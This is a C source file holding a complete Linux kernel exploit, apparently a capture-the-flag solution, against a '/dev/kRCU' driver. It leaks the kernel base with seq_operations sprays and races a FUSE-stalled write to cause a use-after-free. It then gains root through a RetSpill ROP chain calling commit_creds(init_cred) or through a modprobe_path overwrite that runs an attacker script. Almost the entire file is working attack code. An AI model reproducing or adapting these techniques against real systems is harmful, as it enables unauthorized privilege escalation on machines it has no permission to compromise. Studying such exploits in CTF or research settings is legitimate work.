#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/shm.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <syscall.h>

#include <fuse.h>

#define PAGESZ 0x1000

#define DEVNAME "/dev/kRCU"
#define FUSE_PATH "/tmp/a"
#define SEQ_OPS_N 0x20

#define ALLOCATE  0x1337000
#define SETRWPTR  0x1337001
#define DELETE    0x1337002
#define READ      0x1337003
#define WRITE     0x1337004

#define KADDR(x) kbase+(x-0xffffffff81000000)

#define DUMMY_POP    KADDR(0xffffffff813e5239)
#define RET_200h       KADDR(0xffffffff81d82a67)
#define POP_RDI        KADDR(0xffffffff818c6dfe)
#define INIT_CRED      KADDR(0xffffffff82a4d278)
#define COMMIT_CREDS   KADDR(0xffffffff810a9100)

#define MSLEEP KADDR(0xffffffff8111b2a0)
#define SYS_FORK KADDR(0xffffffff8107a390)

struct arg {
  union {
    uint32_t idx;
    void* ptr;
  };
  size_t size;
};

int p[2];
void* addr;
int fd = -1;
int file_size = 0x10000;
int seq_ops[SEQ_OPS_N];
uint64_t kbase = 0;

void log_err(const char *format, ...)
{
    if (!format) {
        exit(EXIT_FAILURE);
    }

    fprintf(stderr, "%s", "[-] ");
    va_list args;
    va_start(args, format);
    vfprintf(stderr, format, args);
    va_end(args);
    fprintf(stderr, "\n");
    fflush(stderr);

    exit(EXIT_FAILURE);
}

#define SAFE(result) \
({ \
    typeof(result) _r = (result); \
    if (_r < 0) log_err("%s:%d: returned %p", __FILE__, __LINE__, _r); \
    _r; \
});

void debug() {
	printf("Debug\n");
    getchar();
}

// Pin thread to a cpu
// @param cpu: cpu id
void pin_thread(int cpu){
    cpu_set_t cs;

    CPU_ZERO(&cs);
    CPU_SET(cpu, &cs);
    if (sched_setaffinity(gettid(), sizeof(cs), &cs))
        log_err("sched_setaffinity");
}

// Examine memory as unsigned long list
// @param buffer: memory address
// @param n: number of elements to print
void examine(void* buffer, int n){
    // buffer = (uint64_t*)buffer;
    fprintf(stderr, "========================= EXAMINE =========================\n");
    for (int i = 0; i < n; i++){
        fprintf(stderr, "[%04x] 0x%016lx\n", i*8, ((uint64_t*)buffer)[i]);
    }
}

// ===================================================================================
// fuse stuff start

static int hello_getattr(const char *path, struct stat *stbuf)
{
    int res = 0;
    memset(stbuf, 0, sizeof(struct stat));
    if (strcmp(path, "/") == 0) {
        stbuf->st_mode = S_IFDIR | 0755;
        stbuf->st_nlink = 2;
    } else if (strcmp(path, "/ctf") == 0) {
        stbuf->st_mode = S_IFREG | 0666;
        stbuf->st_nlink = 1;
        stbuf->st_size = file_size;
        stbuf->st_blocks = 0;
    } 
    else
        res = -2;
    return res;
}

static int hello_open(const char *path, int options) {
    return 0;
}

static int hello_read(const char *path, char *buf, size_t size, off_t offset) 
{
	pin_thread(1);
	char payload[0x20] = {0};
	read(p[0], &payload, 0x20);

	memcpy(buf, &payload, 0x20);
    return size; 
}

static struct fuse_operations hello_ops = {
    .getattr    = hello_getattr,
    .open       = hello_open,
    .read       = hello_read
};

// fuse stuff end
// ===================================================================================
int allocate(uint32_t idx, size_t size) {
	struct arg arg = {
		.idx = idx,
		.size = size
	};

	return SAFE(ioctl(fd, ALLOCATE, &arg));
}

int set_rwnote(uint32_t idx) {
	struct arg arg = {
		.idx = idx,
		.size = 0
	};

	return SAFE(ioctl(fd, SETRWPTR, &arg));
}

int readNote(void* buffer, size_t size) {
	struct arg arg = {
		.ptr = buffer,
		.size = size
	};

	return SAFE(ioctl(fd, READ, &arg));
}

int writeNote(void* buffer, size_t size) {
	struct arg arg = {
		.ptr = buffer,
		.size = size
	};

	return SAFE(ioctl(fd, WRITE, &arg));
}

int delete(uint32_t idx) {
	struct arg arg = {
		.idx = idx,
		.size = 0
	};

	return SAFE(ioctl(fd, DELETE, &arg));
}

void _setup_fuse() {
	if (fork() == 0) {
		prctl(PR_SET_NAME, "fuseDmon", 0, 0, 0);

		// system("mkdir " FUSE_PATH);
		
		pin_thread(1);
		
		int argc = 2;
		char *argv[] = {
			"/tmp/exploit",
			FUSE_PATH,
			NULL
		};

		dup2(1, 666);
		close(p[1]);	// close write end
		SAFE(fuse_main(argc, argv, &hello_ops));
	}
}

void write_after_free() {
	printf("Blocking write\n");
	writeNote(addr, 0x20);
}

void alloc_seq_ops(int i) {
	seq_ops[i] = SAFE(open("/proc/self/stat", O_RDONLY));
}

void free_seq_ops(int i) {
	SAFE(close(seq_ops[i]));
	seq_ops[i] = 0;
}

void prepare(){
	chdir("/tmp/");

	system("mkdir " FUSE_PATH);
    system("echo -ne '#!/bin/sh\ncat /dev/vdc > /tmp/flag' > /tmp/loooooooooooooooooooooooong");
    system("chmod +x /tmp/loooooooooooooooooooooooong");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/x");
    system("chmod +x /tmp/x");
}

static inline void set_pt_regs() {
	asm volatile(
		// "mov r15, 0xb00b50001;"
		".intel_syntax noprefix;"
		"mov r14, %[pop_rdi];"
		"mov r13, %[init_cred];"
		"mov r12, %[pop_r10];"
		// 1 dummy
		"mov rbx, %[pop_r10];"
		// 1 dummy
		"mov r10, %[commit_creds];"
		"mov r9,  %[fork];"
		"mov r8,  %[msleep];"
		:
		: [pop_rdi] "r" (POP_RDI), [init_cred] "r" (INIT_CRED), [pop_r10] "r" (DUMMY_POP), [commit_creds] "r" (COMMIT_CREDS), [fork] "r" (SYS_FORK), [msleep] "r" (MSLEEP)
	);
}

void get_flag() {
	printf("uid: %d\n", getuid());

	if (!getuid()) {
		printf("I'm root!\n");
		system("cat /dev/vdc");
		exit(-1);
	}
}

int main(int argc, char* argv[], char* envp[]) {
	pthread_t t1, t2, t3, t4;

	bool retspill;

	if (argc < 2) {
		log_err(
			"%s: <method>\n"
			"    - retspill\n"
			"    - modprobepath", argv[0]);
	}

	if (!strcmp("modprobepath", argv[1])) retspill = false;
	else if (!strcmp("retspill", argv[1])) retspill = true;
	else {
		log_err(
			"Invalid method\n"
			"%s: <method>\n"
			"    - retspill\n"
			"    - modprobepath", argv[0]);
	}

	// initial setup
	pipe(p);
	prepare();
	pin_thread(1);

	// initialize fuse filesystem
	_setup_fuse();
	sleep(1);

	// map file from fusefs
	int fuse_fd = SAFE(open(FUSE_PATH "/ctf", O_RDWR));
	printf("[+] Opened fuse file at fd %d\n", fuse_fd);
	addr = SAFE(mmap((void*)0x1337000, PAGESZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED, fuse_fd, 0));
	printf("[+] fuse mmap addr: %p\n", addr);
	
	// open device driver
	fd = SAFE(open(DEVNAME, O_RDONLY));
	printf("[+] Opened device at fd %d\n", fd);

	// ======================= leak kernel base
	uint64_t leaks[4];

	// spray seq operations
	for (int i = 0; i < SEQ_OPS_N; ++i) alloc_seq_ops(i);
	free_seq_ops(0);

	// leak kernel text base
	allocate(0xf, 0x20);
	set_rwnote(0xf);
	readNote(&leaks, 0x20);

	// examine(leaks, 4);
	kbase = leaks[0] - (0xffffffff81290c90 - 0xffffffff81000000);
	printf("[+] kbase: %p\n", kbase);
	printf("[+] modprobepath:     %p\n", KADDR(0Xffffffff82a4db70));
	printf("[+] init_cred:        %p\n", KADDR(INIT_CRED));
	printf("[+] commit_creds:     %p\n", KADDR(COMMIT_CREDS));
	printf("[+] __x64_sys_fork:   %p\n", KADDR(SYS_FORK));
	printf("[+] msleep:           %p\n", KADDR(MSLEEP));

	for (int i = 1; i < SEQ_OPS_N; ++i) free_seq_ops(i);

	// ====================== get rip control
	// prepare for uaf
	allocate(0, 0x20);
	allocate(1, 0x20);
	set_rwnote(0);

	// pause write operation
	pthread_create(&t2, NULL, (void * (*)(void *))&write_after_free, NULL);
	sleep(1);

	// free the object
	set_rwnote(1);
	delete(0);
	// modprobe 0Xffffffff82a4db70

	// sleep(1);

	// RetSpill
	if (retspill) {
		for (int i = 0; i < SEQ_OPS_N; ++i) alloc_seq_ops(i);

		// sleep(1);

		// resume write operation
		uint64_t payload[4] = {
			RET_200h, 
			2, 3, 
			DUMMY_POP
		};
		write(p[1], payload, 0x20);

		for (int i = 0; i < SEQ_OPS_N; ++i) {
			sleep(0.5);
			set_pt_regs();
			asm volatile(
				"mov rdx, 0x10;"
				"mov rsi, rsp;"
					"mov edi, %[fd];"
					"xor rax, rax;"
				"syscall;"
				:
				: [fd] "r" (seq_ops[i])
			);

			get_flag();
		}
	} else {
		uint64_t payload[4] = {1,2,KADDR(0Xffffffff82a4db70),4};
		write(p[1], payload, 0x20);

		sleep(1);
		allocate(2, 0x20);

		// sleep(1);
		allocate(3, 0x20);
		
		// hijack freelist and point it to modprobepath
		set_rwnote(3);
		writeNote("/tmp/loooooooooooooooooooooooong", 0x20);

		// crash, copy flag to /tmp
		system("/tmp/x");
		system("cat /tmp/flag");
	}

	pthread_join(t2, NULL);
	return 0;
}

